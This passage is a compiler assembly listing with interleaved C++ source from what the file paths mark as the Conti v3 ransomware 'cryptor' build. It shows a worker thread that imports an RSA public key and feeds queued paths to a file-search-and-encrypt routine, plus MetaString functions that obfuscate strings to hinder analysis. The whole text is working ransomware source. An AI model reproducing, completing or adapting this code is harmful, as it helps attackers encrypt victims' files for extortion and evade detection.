	00 00		 sub	 rsp, 472		; 000001d8H
  0000e	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00013	48 8d 7c 24 30	 lea	 rdi, QWORD PTR [rsp+48]
  00018	b9 3a 00 00 00	 mov	 ecx, 58			; 0000003aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 f8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+504]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 98 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 61   : 	HCRYPTKEY RsaPublicKey;
; 62   : 	HCRYPTPROV CryptoProvider;
; 63   : 
; 64   : 	if (!GetCryptoProvider(&CryptoProvider)) {

  00049	48 8d 4d 28	 lea	 rcx, QWORD PTR CryptoProvider$[rbp]
  0004d	e8 00 00 00 00	 call	 ?GetCryptoProvider@@YAHPEA_K@Z ; GetCryptoProvider
  00052	85 c0		 test	 eax, eax
  00054	75 0a		 jne	 SHORT $LN7@Threadpool

; 65   : 		pExitThread(EXIT_FAILURE);

  00056	b9 01 00 00 00	 mov	 ecx, 1
  0005b	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN7@Threadpool:

; 66   : 	}
; 67   : 
; 68   : 	if (!pCryptImportKey(CryptoProvider, g_PublicKey, sizeof(g_PublicKey), 0, 0, &RsaPublicKey)) {

  00060	48 8d 45 08	 lea	 rax, QWORD PTR RsaPublicKey$[rbp]
  00064	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00069	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  00071	45 33 c9	 xor	 r9d, r9d
  00074	41 b8 00 10 00
	00		 mov	 r8d, 4096		; 00001000H
  0007a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_PublicKey@@3PAEA ; g_PublicKey
  00081	48 8b 4d 28	 mov	 rcx, QWORD PTR CryptoProvider$[rbp]
  00085	e8 00 00 00 00	 call	 ?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z ; pCryptImportKey
  0008a	85 c0		 test	 eax, eax
  0008c	75 0a		 jne	 SHORT $LN8@Threadpool

; 69   : 		pExitThread(EXIT_FAILURE);

  0008e	b9 01 00 00 00	 mov	 ecx, 1
  00093	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN8@Threadpool:

; 70   : 	}
; 71   : 
; 72   : 	LPBYTE Buffer = (LPBYTE)pVirtualAlloc(NULL, BufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  00098	41 b9 04 00 00
	00		 mov	 r9d, 4
  0009e	41 b8 00 30 00
	00		 mov	 r8d, 12288		; 00003000H
  000a4	ba 00 00 50 00	 mov	 edx, 5242880		; 00500000H
  000a9	33 c9		 xor	 ecx, ecx
  000ab	e8 00 00 00 00	 call	 ?pVirtualAlloc@@YAPEAXPEAX_KKK@Z ; pVirtualAlloc
  000b0	48 89 45 48	 mov	 QWORD PTR Buffer$[rbp], rax

; 73   : 	if (!Buffer) {

  000b4	48 83 7d 48 00	 cmp	 QWORD PTR Buffer$[rbp], 0
  000b9	75 0a		 jne	 SHORT $LN2@Threadpool

; 74   : 		pExitThread(EXIT_FAILURE);

  000bb	b9 01 00 00 00	 mov	 ecx, 1
  000c0	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN2@Threadpool:

; 75   : 	}
; 76   : 
; 77   : 	while (TRUE) {

  000c5	33 c0		 xor	 eax, eax
  000c7	83 f8 01	 cmp	 eax, 1
  000ca	0f 84 f7 00 00
	00		 je	 $LN3@Threadpool

; 78   : 
; 79   : 		pEnterCriticalSection(&ThreadPoolInfo->CriticalSection);

  000d0	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  000d7	48 83 c0 18	 add	 rax, 24
  000db	48 8b c8	 mov	 rcx, rax
  000de	e8 00 00 00 00	 call	 ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection

; 80   : 
; 81   : 
; 82   : 		PTASK_INFO TaskInfo = TAILQ_FIRST(&ThreadPoolInfo->TaskList);

  000e3	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  000ea	48 8b 40 40	 mov	 rax, QWORD PTR [rax+64]
  000ee	48 89 45 68	 mov	 QWORD PTR TaskInfo$5[rbp], rax

; 83   : 		if (!TaskInfo) {

  000f2	48 83 7d 68 00	 cmp	 QWORD PTR TaskInfo$5[rbp], 0
  000f7	75 1f		 jne	 SHORT $LN6@Threadpool

; 84   : 
; 85   : 			pLeaveCriticalSection(&ThreadPoolInfo->CriticalSection);

  000f9	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00100	48 83 c0 18	 add	 rax, 24
  00104	48 8b c8	 mov	 rcx, rax
  00107	e8 00 00 00 00	 call	 ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection

; 86   : 			pSleep(5000);

  0010c	b9 88 13 00 00	 mov	 ecx, 5000		; 00001388H
  00111	e8 00 00 00 00	 call	 ?pSleep@@YAXK@Z		; pSleep

; 87   : 			continue;

  00116	eb ad		 jmp	 SHORT $LN2@Threadpool
$LN6@Threadpool:

; 88   : 
; 89   : 		}
; 90   : 
; 91   : 		TAILQ_REMOVE(&ThreadPoolInfo->TaskList, TaskInfo, Entries);

  00118	48 8b 45 68	 mov	 rax, QWORD PTR TaskInfo$5[rbp]
  0011c	48 83 78 28 00	 cmp	 QWORD PTR [rax+40], 0
  00121	74 16		 je	 SHORT $LN11@Threadpool
  00123	48 8b 45 68	 mov	 rax, QWORD PTR TaskInfo$5[rbp]
  00127	48 8b 40 28	 mov	 rax, QWORD PTR [rax+40]
  0012b	48 8b 4d 68	 mov	 rcx, QWORD PTR TaskInfo$5[rbp]
  0012f	48 8b 49 30	 mov	 rcx, QWORD PTR [rcx+48]
  00133	48 89 48 30	 mov	 QWORD PTR [rax+48], rcx
  00137	eb 13		 jmp	 SHORT $LN12@Threadpool
$LN11@Threadpool:
  00139	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00140	48 8b 4d 68	 mov	 rcx, QWORD PTR TaskInfo$5[rbp]
  00144	48 8b 49 30	 mov	 rcx, QWORD PTR [rcx+48]
  00148	48 89 48 48	 mov	 QWORD PTR [rax+72], rcx
$LN12@Threadpool:
  0014c	48 8b 45 68	 mov	 rax, QWORD PTR TaskInfo$5[rbp]
  00150	48 8b 40 30	 mov	 rax, QWORD PTR [rax+48]
  00154	48 8b 4d 68	 mov	 rcx, QWORD PTR TaskInfo$5[rbp]
  00158	48 8b 49 28	 mov	 rcx, QWORD PTR [rcx+40]
  0015c	48 89 08	 mov	 QWORD PTR [rax], rcx
  0015f	33 c0		 xor	 eax, eax
  00161	85 c0		 test	 eax, eax
  00163	75 b3		 jne	 SHORT $LN6@Threadpool

; 92   : 
; 93   : 		pLeaveCriticalSection(&ThreadPoolInfo->CriticalSection);

  00165	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0016c	48 83 c0 18	 add	 rax, 24
  00170	48 8b c8	 mov	 rcx, rax
  00173	e8 00 00 00 00	 call	 ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection

; 94   : 
; 95   : 		if (TaskInfo->Stop) {

  00178	48 8b 45 68	 mov	 rax, QWORD PTR TaskInfo$5[rbp]
  0017c	83 78 20 00	 cmp	 DWORD PTR [rax+32], 0
  00180	74 02		 je	 SHORT $LN13@Threadpool

; 96   : 			break;

  00182	eb 43		 jmp	 SHORT $LN3@Threadpool
$LN13@Threadpool:

; 97   : 		}
; 98   : 
; 99   : 		filesystem::SearchFiles(TaskInfo->Path, CryptoProvider, RsaPublicKey, Buffer);

  00184	48 8d 85 48 01
	00 00		 lea	 rax, QWORD PTR $T6[rbp]
  0018b	48 89 85 88 01
	00 00		 mov	 QWORD PTR $T7[rbp], rax
  00192	48 8b 45 68	 mov	 rax, QWORD PTR TaskInfo$5[rbp]
  00196	48 8b d0	 mov	 rdx, rax
  00199	48 8b 8d 88 01
	00 00		 mov	 rcx, QWORD PTR $T7[rbp]
  001a0	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  001a5	4c 8b 4d 48	 mov	 r9, QWORD PTR Buffer$[rbp]
  001a9	4c 8b 45 08	 mov	 r8, QWORD PTR RsaPublicKey$[rbp]
  001ad	48 8b 55 28	 mov	 rdx, QWORD PTR CryptoProvider$[rbp]
  001b1	48 8b c8	 mov	 rcx, rax
  001b4	e8 00 00 00 00	 call	 ?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z ; filesystem::SearchFiles

; 100  : 		free(TaskInfo);

  001b9	48 8b 4d 68	 mov	 rcx, QWORD PTR TaskInfo$5[rbp]
  001bd	e8 00 00 00 00	 call	 free

; 101  : 
; 102  : 	}

  001c2	e9 fe fe ff ff	 jmp	 $LN2@Threadpool
$LN3@Threadpool:

; 103  : 
; 104  : 	pExitThread(EXIT_SUCCESS);

  001c7	33 c9		 xor	 ecx, ecx
  001c9	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread

; 105  : 	return EXIT_SUCCESS;

  001ce	33 c0		 xor	 eax, eax

; 106  : }

  001d0	8b f8		 mov	 edi, eax
  001d2	48 8d 4d d0	 lea	 rcx, QWORD PTR [rbp-48]
  001d6	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcFrameData
  001dd	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001e2	8b c7		 mov	 eax, edi
  001e4	48 8b 8d 98 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001eb	48 33 cd	 xor	 rcx, rbp
  001ee	e8 00 00 00 00	 call	 __security_check_cookie
  001f3	48 8d a5 a8 01
	00 00		 lea	 rsp, QWORD PTR [rbp+424]
  001fa	5f		 pop	 rdi
  001fb	5d		 pop	 rbp
  001fc	c3		 ret	 0
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z ENDP	; ThreadpoolHandler
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 2a	 sub	 eax, 42			; 0000002aH
  0002d	6b c0 e8	 imul	 eax, eax, -24
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 25	 imul	 eax, eax, 37		; 00000025H
  0002d	83 c0 2a	 add	 eax, 42			; 0000002aH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 42	 cmp	 QWORD PTR i$1[rbp], 66	; 00000042H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
